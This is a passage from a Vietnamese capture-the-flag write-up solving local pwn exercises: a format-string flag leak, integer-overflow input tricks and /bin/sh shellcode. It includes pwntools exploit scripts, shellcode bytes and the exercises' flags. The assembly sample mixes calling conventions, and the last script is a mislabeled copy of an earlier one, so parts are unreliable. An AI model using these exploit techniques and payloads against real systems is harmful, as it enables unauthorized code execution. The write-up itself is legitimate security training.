hoặc chúng ta có thể đọc hàm main và thấy biến secret sẽ ở vị trí cuối cùng của hàm fscanf nên trước khi thực hiện hàm fscanf secret sẽ được nạp đầu tiên vào stack
![image](https://hackmd.io/_uploads/By0FEgdwT.png)

hay debug và vào trong hàm fscanf() trong hàm main() chúng ta có thể thấy chuỗi flag được trỏ bởi secret có địa chỉ là 0x804a060:
![image](https://hackmd.io/_uploads/BkFXGZuvp.png)


và nó chính là **0x804a060** và để lấy giá trị từ địa chỉ này chúng ta dùng %s

![image](https://hackmd.io/_uploads/r1krBgdPa.png)

chúng ta thấy tại vị trí thứ 4 thì chúng ta có thể đọc lại giá trị mà ta nhập vào 

```python=
#!/usr/bin/python3.7
from pwn import *
context.binary = exe = ELF('./Formatstring-leak-flag-in-mem-bss')

p = process(exe.path)

# input()

payload = p32(0x0804a060)
payload += f'%4$s'.encode()
p.send(payload)

p.interactive()
```

![image](https://hackmd.io/_uploads/Sk5mvg_Da.png)
hoặc:
```python=
 python -c 'print "\x60\xa0\x04\x08" + "%4$s"' | ./Formatstring-leak-flag-in-mem-bss
 ```

![image](https://hackmd.io/_uploads/Bynvte_Da.png)


và mình được flag là:
**KMA{YOUR_HAND_IS_TOO_LONG}**

## Integer-overflow-1
![image](https://hackmd.io/_uploads/B17oeWYv6.png)

đây là file 32 bit
và mình đọc source code được:
![image](https://hackmd.io/_uploads/ByaaeZFv6.png)
có thể thấy bài dùng hàm atoi() đề chuyển từ mảng ký tự về kiểu int(giá trị từ -2^31 đến 2^31-1) và gán cho biến temp nhưng biến temp lại có kiểu giá trị unsigned int chỉ nhận giá trị dương(từ 0 đến 2^32) do đó khi ta nhập một số âm rồi gán vào temp thì nó sẽ bị tràn và cho ta 1 số có giá trị bằng(2^32 + số âm chúng ta nhập).
Mặc dù giá trị lớn nhất của int cũng lớn hơn số 99999 nhưng chúng ta chỉ được nhập 3 ký tự. Vậy nên để temp > 99999 chúng ta sẽ nhập số -1

![image](https://hackmd.io/_uploads/ByabQbtvT.png)

và mình nhận được flag là:
**KMA{WHAT? WHERE IS THAT MONEY COME FROM?}**

## Integer-overflow-2

![image](https://hackmd.io/_uploads/BJIfNZtwp.png)

đây là file 32 bit
và mình đọc source code được:

![image](https://hackmd.io/_uploads/B15U4-FPT.png)
![image](https://hackmd.io/_uploads/By0vEZKPp.png)

đoán số mà chương trình đang nghĩ. Chương trình gian lận và lúc nào người chơi cũng sẽ thua. Nếu người chơi dù thắng được 1$ chương trình sẽ đưa người chơi FLAG.
Chương trình hỏi người chơi mức đặt cượt và ngăn không cho nhập dấu trừ. Chương trình luôn thắng nên số tiền sau khi chơi bao giờ cũng <= số tiền ban đầu. Người chơi không thể đặt cược lớn hơn số tiền người chơi đang có. Nếu sau khi chơi số tiền người chơi tăng lên dù chỉ 1$ thì chương trình sẽ đưa người chơi FLAG.
Ở đây chương trình đã chặn nhập số âm, khác với bài trước bài này sử dụng strtoul giá trị trả ra là unsigned long int nên ta nhập vào unsigned long int 4294967295 = 0xffffffff thì khi ghi lên biến int (biến your_bet) thì your_bet = -1.

![image](https://hackmd.io/_uploads/rJtTB-Yv6.png)

và mình được flag là:
**KMA{WHO NEED THIS SYMBOL "-" ?}**

## Integer-overflow-3
![image](https://hackmd.io/_uploads/SyRSLbFD6.png)

đây là file 32 bit và mình đọc source code được

![image](https://hackmd.io/_uploads/HyqC8btD6.png)
![image](https://hackmd.io/_uploads/ByvJD-tvp.png)
bài này tương tự bài trước nhưng số tiền chúng ta có sẽ phải chính xác bằng 6969
Ở đây chương trình đã chặn nhập số âm, chương trình sử dụng strtoul giá trị trả ra là unsigned long int nên ta nhập vào unsigned long int 4294965327 = 0xFFFFF84F thì khi ghi lên biến int (biến your_bet) thì your_bet = -1969 sẽ làm cho your_money lên đúng 5000 + 1969 = 6969

![image](https://hackmd.io/_uploads/HkuPDZKPp.png)

và mình được flag là:
**KMA{BINGOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO}**

## Integer-overflow-4
![image](https://hackmd.io/_uploads/Bk7zFZFPp.png)

đây là file 32 bit
và mình đọc source code được:

![image](https://hackmd.io/_uploads/S1SDFZFPT.png)

Chương trình cho phép nhập vào số 8 byte kiểm tra xem có lớn hơn 99999 không nếu có thì thoát sau đó do sai sót lại gán số 8 byte thành số 4 byte rồi kiểm tra nếu lớn hơn 99999 thì sẽ đọc cho người chơi FLAG.
18446744071562067967 = 0xffffffff7fffffff = -2147483649 (8 byte) và khi bị cắt chỉ còn 4 byte thấp thì sẽ chỉ còn 0x7fffffff = 2147483647 > 99999
![image](https://hackmd.io/_uploads/S16OjZKwp.png)

và mình được flag là: 
**KMA{OH NO ... I SET 4byte-int = 8byte-int}**

## Shellcode-1
![image](https://hackmd.io/_uploads/SkJMkztwp.png)

đây là file 32 bit
và mình đọc source code được:

![image](https://hackmd.io/_uploads/B11_1MKwa.png)
![image](https://hackmd.io/_uploads/B1StyMKPT.png)

Chương trình cho phép nhập vào shellcode sau đó thực thi shellcode
Shellcode không cho phép kí tự 0B cũng chính là giá trị cần đưa vào eax để thực hiện lệnh ngắt execv
Để thực thi được /bin/sh shellcode cần đưa CPU về trạng thái như sau: EAX = 0xb, EBX = [địa chỉ chứa chuỗi /bin/sh], ECX = EDX = 0; Sau đó là thực thi câu lệnh int 0x80.
Để vẫn thực hiện lệnh ngắt thực thi vượt qua việc cấm này ta có thể sử dụng các câu lệnh như ADD, XOR, SUB. Ví dụ
xor eax, eax
add eax, 0x1
add eax, 0xa

![image](https://hackmd.io/_uploads/r1I17OKw6.png)

chúng ta thấy stack có quyền thực thi khi NX tắt và khi chạy đến ret() chúng ta sẽ được thực thi shell code mà chúng ta đã viết vào biến code trên stack

mình dùng https://defuse.ca/online-x86-assembler.htm#disassembly2 để viết shellcode

![image](https://hackmd.io/_uploads/S1pdNZiDp.png)

![image](https://hackmd.io/_uploads/BJF9NZova.png)


```python=
section .text
global _start
_start:
    mov al, 0x3b
    mov edi, 996700987
    push  edi
    mov edi, esp
    xor esi, esi
    xor edx, edx
    syscall
    mov al, 1
    int 0x80
```

![image](https://hackmd.io/_uploads/BJoPI_KvT.png)



```python=
#!/usr/bin/python3.7

from pwn import *

context.binary = exe = ELF('./Shellcode-1')

p = process(exe.path)

shellcode =b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x04\x0a\xfe\xc0\xcd\x80'
payload = shellcode
p.sendlineafter(b'0B\n', payload)
# p.sendline(b'cat flag')

p.interactive()
```
![image](https://hackmd.io/_uploads/Hkh1THqv6.png)


## Shellcode-2
```python=
#!/usr/bin/python3.7

from pwn import *

context.binary = exe = ELF('./Shellcode-2')

p = process(exe.path)

shellcode =b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x04\x0a\xfe\xc0\xcd\x80'
payload = shellcode
p.sendlineafter(b'E3\n', payload)
# p.sendline(b'cat flag')

p.interactive()
```

## Shellcode-5

```python=
#!/usr/bin/python3.7

from pwn import *

context.binary = exe = ELF('./Shellcode-2')

p = process(exe.path)

shellcode =b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x04\x0a\xfe\xc0\xcd\x80'
payload = shellcode
p.sendlineafter(b'E3\n', payload)
# p.sendline(b'cat flag')

p.interactive()
```
